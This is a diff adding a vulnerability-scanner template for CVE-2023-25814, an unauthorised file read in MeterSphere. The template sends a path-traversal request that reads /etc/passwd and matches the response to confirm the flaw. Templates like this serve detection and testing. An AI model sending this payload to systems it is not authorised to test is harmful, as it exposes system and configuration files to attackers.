@@ -1,0 +1,39 @@
+id: CVE-2023-25814
+
+info:
+  name: MeterSphere File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    MeterSphere has an unauthorized arbitrary file read vulnerability that can be exploited to read sensitive files like source code and database configuration files.
+  tags: file-read
+  reference:
+    - https://github.com/metersphere/metersphere/security/advisories/GHSA-fwc3-5h55-mh2j
+  classification:
+    cve-id: CVE-2023-25814
+    cvss-score: 7.5
+
+variables:
+  filePath: "./../../../../../../../../../../../../../../../../etc/"
+  fileName: "passwd"
+
+http:
+  - raw:
+      - |
+        GET /resource/ui/get?fileName={{fileName}}&reportId={{filePath}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ":x:"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?s)(.*)"
+        internal: true
